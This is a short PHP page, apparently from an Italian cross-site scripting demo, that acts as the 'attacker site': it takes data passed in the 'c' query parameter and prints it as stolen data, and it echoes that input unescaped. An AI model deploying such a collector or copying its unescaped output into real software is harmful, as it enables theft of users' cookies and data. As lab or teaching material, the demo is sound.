<html>
    <head>
        <title>XSS Attack - Attacker page</title>
    </head>
    <body bgcolor="#ffb3ff">
        <h3>Recupero dati rubati a un sito non sicuro (sito attaccante)</h3><br>
        <?php
            $seed = str_replace('_', ' ', $_GET['c']);
            print "il dato rubato è:<br>\"$seed\"";
        ?>
    </body>
</html>


        

